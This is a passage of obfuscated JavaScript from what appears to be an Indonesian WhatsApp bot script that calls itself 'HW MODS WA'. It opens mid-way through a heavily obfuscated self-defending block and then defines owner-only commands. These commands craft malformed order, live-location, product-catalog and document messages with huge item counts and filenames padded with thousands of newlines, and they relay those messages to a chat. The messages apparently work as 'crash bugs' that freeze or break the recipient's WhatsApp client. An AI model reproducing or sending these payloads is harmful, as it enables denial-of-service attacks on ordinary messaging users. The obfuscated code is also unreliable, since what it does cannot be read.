_0x153e57+_0x1b8f57;},'bTmku':_0x4d3911(0x54c,0x4fd,0x4cc,0x5af,0x4e7),'AaWaV':_0x194a68(0xf5,0x191,0x10d,0x1c6,0x1f2),'GRoOD':_0x59d0f9(0x502,0x490,0x46a,0x57f,0x574)+_0x194a68(0x1cc,0x122,0xc3,0x10f,0xce)+'t','gOEjh':function(_0x1fc09b,_0x348af5){return _0x1fc09b(_0x348af5);},'gRiex':_0x2c2f3a(0x4e,0x91,0x21,0x8b,0x83)+_0x194a68(0x16f,0x144,0x114,0x117,0x17d)+_0x194a68(0x18f,0x14d,0x131,0xc2,0x1b5)+_0x2f4879(0x1b7,0x222,0x1d6,0x1ce,0x1a7),'XbBHE':_0x59d0f9(0x5ec,0x67a,0x65a,0x567,0x58d)+_0x2c2f3a(0x18,-0xa0,-0x5a,-0x2c,-0x109)+_0x2f4879(0x108,0x114,0xf2,0x17c,0x87)+_0x4d3911(0x467,0x3da,0x4d0,0x480,0x429)+_0x194a68(0x14a,0x127,0x8d,0xe1,0xee)+_0x59d0f9(0x54c,0x5ef,0x4fb,0x5f7,0x4db)+'\x20)','wFOPX':_0x59d0f9(0x582,0x53c,0x5c7,0x58a,0x569)+_0x4d3911(0x4db,0x4ff,0x565,0x53a,0x539)+_0x194a68(0x185,0x188,0x1d3,0xd6,0xdd),'OWtxX':_0x2f4879(0x87,0xf6,0x116,-0x18,-0x1)+'er','XHaxn':function(_0x535887,_0x5083f6){return _0x535887!==_0x5083f6;},'tagIS':_0x2c2f3a(0x36,0x19,0xb,-0x89,-0x84),'RKsKI':function(_0x17d332,_0x451568){return _0x17d332===_0x451568;},'PvenV':_0x194a68(0x174,0x11a,0xd9,0xd9,0x18b),'AzRpS':_0x194a68(0x16b,0xbd,0x35,0xc,0x17),'mbNAg':function(_0x9cec20,_0x5ee7f9){return _0x9cec20===_0x5ee7f9;},'plXUB':_0x59d0f9(0x54f,0x515,0x4f5,0x5b2,0x56b),'VWrmY':_0x4d3911(0x565,0x59b,0x4b5,0x60c,0x52b),'CjbOl':_0x2c2f3a(-0x11,0x85,0x84,0x4a,0x5c)+'g','bdVcW':function(_0x1484a6,_0x5431f4){return _0x1484a6===_0x5431f4;},'fjMTb':_0x59d0f9(0x5af,0x5fb,0x64f,0x50c,0x532),'yOnjk':_0x194a68(0x5d,0x6b,0xd0,0x95,0x89),'MzLWm':function(_0x3498d7,_0x1dfcd3){return _0x3498d7!==_0x1dfcd3;},'IyHsU':_0x2c2f3a(-0xdd,-0x1c,-0x5e,-0x22,0x4e),'EtOXE':function(_0x1b801e,_0x196dde){return _0x1b801e+_0x196dde;},'vzEgX':function(_0x3400ab,_0x234034){return _0x3400ab/_0x234034;},'nAFZt':_0x2f4879(0x1ab,0x15e,0x184,0x1ed,0x1f5)+'h','giEYt':function(_0x489be8,_0xd8e886){return _0x489be8%_0xd8e886;},'Fbwxd':function(_0x40f03c,_0x1dda2d){return _0x40f03c===_0x1dda2d;},'yimZu':_0x2c2f3a(0xb7,-0x6f,0x37,-0x2c,0x8e),'oWsfL':function(_0x26a70d,_0x413839){return _0x26a70d+_0x413839;},'DNwUN':_0x2c2f3a(0x1e,0xbe,0x95,0xe1,0x10e)+'n','MsRMJ':_0x2c2f3a(-0x86,0x3a,-0x70,-0x109,-0xd5),'oomgb':_0x59d0f9(0x5b5,0x661,0x52d,0x5ab,0x60a),'Uwvyt':function(_0x5b4452,_0x4ee5d1){return _0x5b4452(_0x4ee5d1);},'chZxJ':function(_0x4e1e87,_0x2b0839){return _0x4e1e87+_0x2b0839;},'ofclY':function(_0xe43dcb,_0x5ac889){return _0xe43dcb+_0x5ac889;},'MMawT':function(_0x468754,_0x38e361){return _0x468754+_0x38e361;},'ylCWM':_0x2c2f3a(0x67,0x8e,0x77,0x6c,0x51),'yXEsX':function(_0x474fe2,_0x4b059a){return _0x474fe2===_0x4b059a;},'dvDyo':_0x2f4879(0xc4,0xfc,0xdb,0x6e,0x60),'wjZdA':_0x2c2f3a(0xf7,0x62,0x6d,0x55,-0x46),'lVwyb':_0x194a68(0xd1,0xb1,0x4d,0x38,0x23),'pLfid':function(_0x276785,_0x3131bf){return _0x276785(_0x3131bf);}};function _0x2bd8cc(_0x3bde95){function _0x515daa(_0x82930,_0x1a50df,_0x146c19,_0x52ae80,_0x19b702){return _0x59d0f9(_0x146c19- -0x101,_0x82930,_0x146c19-0x185,_0x52ae80-0xc6,_0x19b702-0xc7);}function _0x3d409d(_0x4161b1,_0x4ff7b5,_0xd4545a,_0x242ef1,_0x3c3d7d){return _0x4d3911(_0x3c3d7d- -0x26,_0x4ff7b5-0x148,_0x4161b1,_0x242ef1-0x114,_0x3c3d7d-0xd4);}function _0x50d48a(_0x345d13,_0x496409,_0x36604f,_0x437a80,_0x5d8994){return _0x59d0f9(_0x496409- -0x4f4,_0x345d13,_0x36604f-0x179,_0x437a80-0xb,_0x5d8994-0x146);}function _0x5c65c0(_0x5a098f,_0x10d2d6,_0x2602c6,_0x3da2ef,_0xbeb98d){return _0x194a68(_0x5a098f-0x165,_0xbeb98d-0x324,_0x5a098f,_0x3da2ef-0x141,_0xbeb98d-0x52);}function _0x56fed0(_0x3632a9,_0x27d4b4,_0x32adf3,_0x5d8e0b,_0x2b800b){return _0x194a68(_0x3632a9-0xf6,_0x3632a9-0x18,_0x2b800b,_0x5d8e0b-0x14,_0x2b800b-0x164);}const _0x4f1c6c={'ZGBor':function(_0x16a2b6,_0x856da7){function _0x190153(_0x4b3e5d,_0x523b3d,_0x1f8baa,_0x21de76,_0x4f22a6){return _0x407e(_0x523b3d-0x170,_0x21de76);}return _0x2aa016[_0x190153(0x33b,0x307,0x33c,0x3b6,0x2f1)](_0x16a2b6,_0x856da7);},'zJbSx':function(_0x238264,_0x17ac46){function _0x1ca583(_0x143e93,_0x2c8833,_0x1fa41d,_0x1028b0,_0x59b39f){return _0x407e(_0x1fa41d- -0x2c5,_0x1028b0);}return _0x2aa016[_0x1ca583(-0xc3,-0xd6,-0x8c,0x1c,-0x105)](_0x238264,_0x17ac46);},'oClOO':function(_0x29cbc5,_0x3a0321){function _0x493e9c(_0x179526,_0x48c81c,_0x1bf18c,_0x2a8403,_0x303eb5){return _0x407e(_0x303eb5-0x196,_0x2a8403);}return _0x2aa016[_0x493e9c(0x3d6,0x35d,0x357,0x452,0x3cf)](_0x29cbc5,_0x3a0321);},'lVwpe':_0x2aa016[_0x5c65c0(0x39e,0x3e0,0x3dc,0x3c1,0x37d)],'NgRKt':_0x2aa016[_0x515daa(0x45f,0x541,0x4d8,0x454,0x4a9)],'wUweO':_0x2aa016[_0x56fed0(0x89,0x97,0xbb,0x57,0xd0)],'YRCfs':_0x2aa016[_0x3d409d(0x57d,0x502,0x47e,0x494,0x4da)],'COouT':function(_0x43bd5d,_0x320e70){function _0x51cbbf(_0x44c3d2,_0x19339f,_0x470275,_0x1833c4,_0x24101f){return _0x3d409d(_0x1833c4,_0x19339f-0x1bf,_0x470275-0xbf,_0x1833c4-0xf2,_0x24101f- -0x17c);}return _0x2aa016[_0x51cbbf(0x44d,0x479,0x450,0x41c,0x419)](_0x43bd5d,_0x320e70);},'QrTxl':_0x2aa016[_0x56fed0(0xc1,0x29,0x12e,0x51,0xbf)],'FmFrU':function(_0x816282,_0x19a524){function _0x1dca0a(_0x453462,_0x54a6c6,_0x1ef6eb,_0x4e7143,_0x58dc89){return _0x56fed0(_0x4e7143- -0xfc,_0x54a6c6-0x125,_0x1ef6eb-0x74,_0x4e7143-0x1ba,_0x54a6c6);}return _0x2aa016[_0x1dca0a(-0xe1,-0x9d,-0xf4,-0x5e,0x37)](_0x816282,_0x19a524);},'ebvNR':_0x2aa016[_0x3d409d(0x566,0x538,0x5ab,0x5ef,0x545)],'DtjLs':_0x2aa016[_0x5c65c0(0x333,0x349,0x2d3,0x3db,0x379)]};if(_0x2aa016[_0x515daa(0x410,0x4da,0x4a9,0x492,0x4a4)](_0x2aa016[_0x56fed0(0x156,0x1e5,0x148,0x1a2,0x166)],_0x2aa016[_0x5c65c0(0x435,0x403,0x424,0x438,0x383)])){const _0xa0a80a=_0x25166e[_0x5c65c0(0x3c7,0x3f9,0x412,0x3f5,0x3d8)+_0x515daa(0x38a,0x41a,0x423,0x43a,0x3a7)+'r'][_0x50d48a(-0xa3,-0x34,-0x9f,-0x31,0x14)+_0x56fed0(0xa8,0x141,0x104,0x6a,0xa2)][_0x3d409d(0x5e3,0x49e,0x4e7,0x55a,0x53a)](_0x44692c),_0x25b305=_0x37fc2e[_0x17c860],_0x2028ae=_0x5dba2b[_0x25b305]||_0xa0a80a;_0xa0a80a[_0x3d409d(0x4e1,0x497,0x396,0x466,0x434)+_0x515daa(0x48d,0x52e,0x48d,0x4a6,0x45e)]=_0x4739e4[_0x5c65c0(0x436,0x4c1,0x519,0x45e,0x46e)](_0x58d399),_0xa0a80a[_0x56fed0(0xed,0x4f,0x11d,0x51,0x140)+_0x56fed0(0x9d,0x113,0x57,0x109,0xe)]=_0x2028ae[_0x50d48a(-0x20,0x38,0xce,-0x5d,-0x79)+_0x515daa(0x3c1,0x444,0x3db,0x357,0x45e)][_0x5c65c0(0x3c6,0x469,0x413,0x45b,0x46e)](_0x2028ae),_0x2dffb2[_0x25b305]=_0xa0a80a;}else{if(_0x2aa016[_0x56fed0(0x16b,0x19b,0x1ba,0xb9,0xf5)](typeof _0x3bde95,_0x2aa016[_0x50d48a(-0x5,0x5f,0xa7,0xb8,-0x20)]))return _0x2aa016[_0x5c65c0(0x3d4,0x373,0x35a,0x3c0,0x3a8)](_0x2aa016[_0x56fed0(0xf7,0x121,0x8e,0x184,0x10f)],_0x2aa016[_0x3d409d(0x4bd,0x4df,0x46d,0x48f,0x43a)])?!![]:function(_0x4312e3){}[_0x50d48a(0x4d,0x17,0x25,0x4c,-0x81)+_0x50d48a(0x4e,0x30,-0x5b,-0x20,0x22)+'r'](_0x2aa016[_0x515daa(0x378,0x468,0x3c7,0x445,0x428)])[_0x515daa(0x42a,0x419,0x398,0x309,0x334)](_0x2aa016[_0x56fed0(0x102,0xc6,0xfb,0xd6,0x54)]);else{if(_0x2aa016[_0x3d409d(0x5b4,0x58e,0x496,0x5d4,0x530)](_0x2aa016[_0x515daa(0x424,0x3f7,0x3c9,0x441,0x458)],_0x2aa016[_0x56fed0(0x8b,0x64,0xf6,-0x4,0x5d)])){let _0x17d5a3;try{_0x17d5a3=_0x4f1c6c[_0x5c65c0(0x556,0x4d6,0x4f5,0x3f6,0x4a9)](_0x48b0a1,_0x4f1c6c[_0x56fed0(0xdb,0x40,0xe1,0x9d,0x13e)](_0x4f1c6c[_0x50d48a(0x2,0x35,0x2e,0x82,0x15)](_0x4f1c6c[_0x3d409d(0x4fd,0x3b3,0x3b7,0x4ef,0x464)],_0x4f1c6c[_0x56fed0(0x80,0xf6,0x5a,0x69,0xa0)]),');'))();}catch(_0x85184e){_0x17d5a3=_0x31df4b;}return _0x17d5a3;}else{if(_0x2aa016[_0x56fed0(0x1bd,0x16b,0x1f8,0x14c,0x268)](_0x2aa016[_0x56fed0(0x1c0,0x10a,0x1c3,0x26d,0x156)]('',_0x2aa016[_0x56fed0(0x175,0x1d8,0x148,0x100,0xec)](_0x3bde95,_0x3bde95))[_0x2aa016[_0x5c65c0(0x3ca,0x3ea,0x2e6,0x3aa,0x386)]],-0x1748+-0x10e2+0x282b)||_0x2aa016[_0x515daa(0x44a,0x431,0x3da,0x3cf,0x388)](_0x2aa016[_0x515daa(0x416,0x351,0x3b4,0x362,0x370)](_0x3bde95,-0xd80+0x676*-0x1+0x140a),-0x107*0x1+-0x2a1*0x1+0x3a8)){if(_0x2aa016[_0x56fed0(0x144,0xa3,0x195,0x1f3,0x141)](_0x2aa016[_0x3d409d(0x3cb,0x4ec,0x441,0x4db,0x468)],_0x2aa016[_0x56fed0(0x90,0x123,0x138,0xbf,0xf2)]))(function(){function _0x411a8a(_0x5e8132,_0x5b9544,_0x4abbd8,_0x4f058b,_0x19de14){return _0x515daa(_0x4abbd8,_0x5b9544-0x14,_0x5e8132- -0x20a,_0x4f058b-0x28,_0x19de14-0x70);}function _0xaf047(_0x464278,_0x4f0d65,_0x4254dc,_0x6dc3e,_0x233174){return _0x56fed0(_0x464278- -0x298,_0x4f0d65-0xdc,_0x4254dc-0x5d,_0x6dc3e-0x92,_0x6dc3e);}function _0x2dab37(_0x17baa3,_0x289ac2,_0x4bbad4,_0x1a6939,_0x1be3c3){return _0x50d48a(_0x17baa3,_0x1be3c3-0xe3,_0x4bbad4-0x1b3,_0x1a6939-0x1e4,_0x1be3c3-0x67);}function _0x7858dc(_0x1bf618,_0x3ee7aa,_0x388c15,_0x268064,_0x2c4026){return _0x3d409d(_0x388c15,_0x3ee7aa-0xd8,_0x388c15-0xa0,_0x268064-0x6e,_0x1bf618- -0x354);}function _0x3d9de9(_0x25ee83,_0x5f07f7,_0x338e18,_0x2611d5,_0x35a444){return _0x515daa(_0x35a444,_0x5f07f7-0x1ab,_0x25ee83- -0x300,_0x2611d5-0x44,_0x35a444-0x183);}return _0x4f1c6c[_0x7858dc(0x116,0x10d,0x187,0xa4,0x1a0)](_0x4f1c6c[_0x7858dc(0xf3,0x117,0x9b,0x52,0x16d)],_0x4f1c6c[_0x411a8a(0x1a3,0x11f,0x15f,0x20a,0x1b3)])?function(_0x163634){}[_0x2dab37(0xe7,0x11e,0x4c,0x140,0xfa)+_0x2dab37(0xe9,0x14a,0xa5,0x149,0x113)+'r'](_0x4f1c6c[_0x3d9de9(0xec,0x8a,0xb0,0x16a,0x173)])[_0xaf047(-0x23e,-0x1b7,-0x2e5,-0x1c9,-0x262)](_0x4f1c6c[_0x2dab37(0xee,0x142,0x1bd,0x1a5,0x133)]):!![];}[_0x515daa(0x411,0x367,0x40a,0x377,0x3cf)+_0x3d409d(0x453,0x56c,0x40a,0x47e,0x4bd)+'r'](_0x2aa016[_0x56fed0(0x1a5,0x1a6,0x117,0x10b,0x117)](_0x2aa016[_0x3d409d(0x4d9,0x467,0x46c,0x53e,0x4d8)],_0x2aa016[_0x50d48a(-0x8,0x6c,-0x47,0xd9,0xd6)]))[_0x5c65c0(0x4b5,0x47a,0x405,0x42b,0x41b)](_0x2aa016[_0x515daa(0x428,0x3d4,0x3e0,0x431,0x362)]));else{const _0x17a3a2=_0x752f19[_0x50d48a(-0x4,-0x5b,-0x22,-0x95,-0x8b)](_0x18cd7f,arguments);return _0x3d05e5=null,_0x17a3a2;}}else _0x2aa016[_0x50d48a(0x11c,0xa3,0xe2,0x24,0xad)](_0x2aa016[_0x515daa(0x493,0x45f,0x4f9,0x580,0x47d)],_0x2aa016[_0x56fed0(0xbb,0x35,0xfe,0x29,0xb1)])?function(){function _0x549b48(_0x4f2bae,_0x31e53d,_0x2daf10,_0x5359fc,_0x78e6dc){return _0x50d48a(_0x5359fc,_0x78e6dc-0x4cc,_0x2daf10-0x1d2,_0x5359fc-0x191,_0x78e6dc-0x10f);}function _0x33ae33(_0x21e0af,_0x1c5604,_0x304320,_0x28e110,_0x525b8b){return _0x5c65c0(_0x28e110,_0x1c5604-0xad,_0x304320-0x1f0,_0x28e110-0xc2,_0x525b8b- -0x1c7);}function _0x1366f5(_0x331599,_0x246bd5,_0x59f681,_0x297a4a,_0x500c49){return _0x5c65c0(_0x500c49,_0x246bd5-0x135,_0x59f681-0x147,_0x297a4a-0xbf,_0x297a4a- -0x2f2);}function _0x27ed4d(_0x3e0583,_0x81194c,_0x349c70,_0x4b9185,_0x904f67){return _0x515daa(_0x4b9185,_0x81194c-0x160,_0x81194c- -0x398,_0x4b9185-0xb6,_0x904f67-0x13b);}if(_0x4f1c6c[_0x549b48(0x5b4,0x5a0,0x55a,0x55d,0x5b0)](_0x4f1c6c[_0x549b48(0x587,0x5b5,0x5a2,0x585,0x55e)],_0x4f1c6c[_0x27ed4d(0xdc,0x162,0xf5,0xb2,0xd6)])){if(_0x7d5770){const _0x53e2f3=_0x5c3ba4[_0x1366f5(0x114,0x11b,0xa3,0x74,0x62)](_0x5d0009,arguments);return _0x43bb46=null,_0x53e2f3;}}else return![];}[_0x515daa(0x48b,0x40d,0x40a,0x3e0,0x4b8)+_0x50d48a(-0x56,0x30,-0x4f,0xcc,0x81)+'r'](_0x2aa016[_0x5c65c0(0x4e6,0x44c,0x4f0,0x534,0x4b6)](_0x2aa016[_0x5c65c0(0x417,0x40c,0x471,0x376,0x40c)],_0x2aa016[_0x56fed0(0x121,0xb9,0x127,0xea,0xdf)]))[_0x515daa(0x36c,0x34a,0x398,0x324,0x2f0)](_0x2aa016[_0x3d409d(0x4d8,0x4e0,0x55f,0x5b0,0x555)]):function(){return![];}[_0x50d48a(-0x33,0x17,0xbb,0x1,-0x8f)+_0x5c65c0(0x40a,0x423,0x3fb,0x3f1,0x3f1)+'r'](_0x2aa016[_0x5c65c0(0x565,0x550,0x41c,0x525,0x4b6)](_0x2aa016[_0x3d409d(0x540,0x463,0x42f,0x505,0x4d8)],_0x2aa016[_0x5c65c0(0x3b0,0x453,0x394,0x412,0x42d)]))[_0x515daa(0x404,0x306,0x398,0x2e6,0x379)](_0x2aa016[_0x50d48a(0xb0,0xc8,0xa4,0x20,0x13b)]);}}_0x2aa016[_0x56fed0(0xe2,0x3d,0x63,0x139,0x193)](_0x2bd8cc,++_0x3bde95);}}function _0x2f4879(_0x36c906,_0x254ea1,_0x12b8f6,_0x5e7d6e,_0x3a7676){return _0x51ba1e(_0x36c906-0x1c2,_0x254ea1-0x96,_0x12b8f6-0x8c,_0x3a7676,_0x36c906- -0xd9);}function _0x4d3911(_0xac95f2,_0x45623a,_0x43407b,_0x5776a5,_0x1b00c1){return _0x3d7778(_0xac95f2-0x2c,_0x45623a-0x12f,_0x43407b-0x19d,_0xac95f2-0x2f4,_0x43407b);}function _0x194a68(_0x1dbc91,_0x16c2e4,_0x50f0ba,_0x1193bf,_0x247fc9){return _0x25d859(_0x50f0ba,_0x16c2e4-0x2a6,_0x50f0ba-0xea,_0x1193bf-0x151,_0x247fc9-0x18b);}try{if(_0x2aa016[_0x59d0f9(0x4db,0x4db,0x4f0,0x4a9,0x4d0)](_0x2aa016[_0x194a68(0x174,0x11f,0x123,0x108,0xe2)],_0x2aa016[_0x59d0f9(0x576,0x4d5,0x5ec,0x4f4,0x5d7)])){if(_0xb8f7b3){if(_0x2aa016[_0x59d0f9(0x4fb,0x470,0x45d,0x5ad,0x480)](_0x2aa016[_0x59d0f9(0x559,0x53d,0x553,0x576,0x5b3)],_0x2aa016[_0x2f4879(0x13e,0x1a0,0xfe,0xaa,0x1cd)]))return _0x2bd8cc;else{let _0x4f3cca;try{_0x4f3cca=_0x2aa016[_0x59d0f9(0x547,0x511,0x495,0x5cb,0x5c4)](_0x320f2f,_0x2aa016[_0x4d3911(0x5a3,0x5fb,0x624,0x617,0x629)](_0x2aa016[_0x2c2f3a(-0x54,0xb6,0x3d,0xf2,-0x2c)](_0x2aa016[_0x194a68(-0x58,0x59,0x2d,0x74,0x38)],_0x2aa016[_0x194a68(0x103,0x182,0x178,0x1cb,0x1e5)]),');'))();}catch(_0x5e214b){_0x4f3cca=_0x125144;}return _0x4f3cca;}}else _0x2aa016[_0x194a68(0x194,0x1a5,0x185,0x12f,0x237)](_0x2aa016[_0x4d3911(0x528,0x5c0,0x503,0x544,0x585)],_0x2aa016[_0x4d3911(0x56f,0x5a7,0x57c,0x536,0x5ab)])?_0x2aa016[_0x59d0f9(0x5f5,0x57d,0x5f9,0x672,0x5ac)](_0x2bd8cc,-0x3*-0x69d+-0x1d4e+0x977):_0x30700d=_0x2aa016[_0x4d3911(0x4e0,0x447,0x506,0x52a,0x463)](_0x199478,_0x2aa016[_0x2f4879(0x13a,0x1cf,0x1dd,0x143,0x99)](_0x2aa016[_0x59d0f9(0x4eb,0x4af,0x530,0x4e9,0x47a)](_0x2aa016[_0x2f4879(0x95,-0x19,0x139,0x13e,0x20)],_0x2aa016[_0x4d3911(0x598,0x593,0x63e,0x5ac,0x574)]),');'))();}else return![];}catch(_0x3b78ec){}}
}
break
case 'jaditroli': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
a = await haikal.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281717802873@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadilokas': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadikatalog': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281717802873','397419wzTxRp','6281717802873@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
sticSukses(from)
}
}
break
//=================================================//
case 'jadidocu': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n